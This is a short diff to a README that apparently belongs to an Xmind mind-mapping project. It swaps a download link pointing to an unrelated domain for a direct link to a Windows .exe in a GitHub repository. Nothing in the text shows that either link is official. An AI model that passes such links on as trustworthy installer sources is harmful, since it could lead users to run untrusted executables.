@@ -17,7 +17,7 @@ Currently supporting mind maps, fishbone diagrams, tree diagrams, org-charts,
 logic charts, and even spreadsheets. Often used for knowledge management,
 meeting minutes, task management, and GTD.
 
-**[Downloads Available For Windows/Mac/Ubuntu](https://cinefilm.pro/xmind/)**
+**[Downloads Available For Windows/Mac/Ubuntu](https://github.com/XmindApp/Xmind/releases/download/24.10.01101/Xmind-for-Windows-x64bit-24.10.01101.exe)**
 
 License
 -------
